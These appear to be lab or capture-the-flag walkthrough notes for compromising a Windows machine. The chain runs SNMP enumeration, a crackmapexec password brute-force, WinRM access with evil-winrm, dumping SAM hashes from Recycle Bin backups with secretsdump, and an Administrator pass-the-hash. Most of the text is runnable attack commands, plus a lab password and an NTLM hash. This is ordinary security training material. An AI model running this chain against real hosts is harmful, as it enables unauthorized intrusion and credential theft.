initial scans showed a bunch of ports open, non of which were helpful.
80, 443; 139-RPC/445-SMB, 3306-MySQL,3389-MS RDP,5985-HTTPAPIwinrm,47001-HTTPAPI

Turns out, SNMP:161 was the initial foothold
so, we use onesixtyone to scan the SNMP 's comminity string
`onesixtyone IP -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt`
it said something like SNMP on IP \[openview\]
So we now use snmp-check to enumerate
`snmp-check IP -c openview`

We see it shows multiple accounts, but only one of them is not default account
 ```text
  Guest               
  Jareth              
  Administrator       
  DefaultAccount      
  WDAGUtilityAccount
```
So, Jareth is the account we focus on.
Maybe we can try brute forcing on SMB, MYSQL, WINRM or RDP?

We'll use crackmapexec to try to get a password
crackmapexec supports SMB, Remote Desktop Protocol (RDP), Lightweight Directory Access Protocol (LDAP), Secure Shell (SSH), and Microsoft SQL (MSSQL).

---
`sudo crackmapexec smb 10.201.23.5 -u 'Jareth' -p /usr/share/wordlists/rockyou.txt`
With this we get password sarah for Jareth, we do an smbmap to enum the shares that are accessible to Jareth.
`smbmap -H 10.201.125.112 -u Jareth -p sarah`
seems like IPC$ is the only share with read access for Jareth
`smbclient //10.201.125.112/IPC$// -U Jareth`
However, there's nothing there.
So we try to log into the winrm default port with those creds
`crackmapexec winrm 10.201.125.112 -u 'Jareth' -p 'sarah'`
This works. so with this, we've verified the reuse of credentials from smb to winrm

---
So we get a shell using evil-winrm
`evil-winrm -u Jareth -p sarah -i 10.201.125.112`
`gci -Force` to show hidden files in powershell, same as gci -h
`gci -path 'C:\$Recycle.bin' -Force
showed us 2 dirs
```text
d--hs- 9/18/2020 7:28 PM S-1-5-21-1987495829-1628902820-919763334-1001
d--hs- 11/13/2020 10:41 PM S-1-5-21-1987495829-1628902820-919763334-500
```
So, it is indexed by SID. A normal user can only access the dir of their own SID, only with Admin's permission, can we access other SID.
To find out SID,
`Get-LocalUser -Name $env:USERNAME | Select SID`
Here, we find sam.bak and system.bak -- can be combined to find the user hashes, and then perform pass-the-hash attack with evil-winrm

---
To combine, use impacket's secretsdump.py or impacket-secretsdump
`impacket-secretsdump -ts local -system system.bak -sam sam.bak`

The hash will be of format
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6bc99ede9edcfecf9662fb0c0ddcfa7a:::
Use the last half of the hash as,
`evil-winrm -i 10.201.125.112 -u Administrator -H 6bc99ede9edcfecf9662fb0c0ddcfa7a`
root shell!
